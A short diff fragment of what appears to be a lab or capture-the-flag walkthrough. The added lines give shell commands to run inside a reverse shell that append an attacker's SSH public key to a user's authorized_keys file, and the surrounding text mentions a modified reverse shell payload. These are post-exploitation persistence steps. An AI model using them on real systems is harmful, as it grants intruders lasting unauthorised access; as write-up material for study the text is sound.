@@ -872,7 +872,11 @@ The key's randomart image is:
 +----[SHA256]-----+
 ```
 
-
+Copy that public key output, then back in the reverse shell run:
+mkdir -p /home/mcp-dev/.ssh
+echo 'PASTE_PUBLIC_KEY_HERE' >> /home/mcp-dev/.ssh/authorized_keys
+chmod 700 /home/mcp-dev/.ssh
+chmod 600 /home/mcp-dev/.ssh/authorized_keys
 
 
 The public key was injected into `/home/mcp-dev/.ssh/authorized_keys` by modifying the reverse shell payload to call `os.makedirs` and `open(...,'a').write(...)` before initiating the socket connection. Verification:
